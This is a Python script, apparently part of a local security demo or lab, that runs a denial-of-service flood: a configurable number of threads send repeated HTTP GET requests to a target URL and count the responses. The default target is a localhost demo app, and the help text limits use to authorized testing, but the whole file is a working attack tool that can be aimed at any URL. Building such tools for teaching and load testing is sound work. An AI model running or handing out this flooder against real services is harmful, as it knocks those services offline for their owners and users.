#Description: Denial of Service (DoS) load generator for the local demo app
#Usage: python attacks/Denial/atta.py -u http://127.0.0.1:5000/ping -n 50

import argparse
import threading
import requests


def attack(url, stop_event, stats, stats_lock):
    while not stop_event.is_set():
        try:
            response = requests.get(url, timeout=2)
            with stats_lock:
                stats[response.status_code] = stats.get(response.status_code, 0) + 1
        except requests.exceptions.RequestException:
            with stats_lock:
                stats["error"] = stats.get("error", 0) + 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Denial of Service load generator for authorized penetration testing",
        epilog="Use responsibly and only against systems you own or are explicitly authorized to test."
    )
    parser.add_argument("-u", "--url", default="http://127.0.0.1:5000/ping",
                        help="Target URL to flood (default: %(default)s)")
    parser.add_argument("-n", "--threads", type=int, default=50,
                        help="Number of concurrent worker threads (default: %(default)s). "
                             "Watch the target's /dashboard to see the effect live.")
    args = parser.parse_args()

    stop_event = threading.Event()
    stats = {}
    stats_lock = threading.Lock()

    threads = []
    print(f"Flooding {args.url} with {args.threads} threads. Press Ctrl+C to stop.")
    for _ in range(args.threads):
        t = threading.Thread(target=attack, args=(args.url, stop_event, stats, stats_lock), daemon=True)
        threads.append(t)
        t.start()

    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
        for t in threads:
            t.join(timeout=2)
        print("Final status counts:", stats)
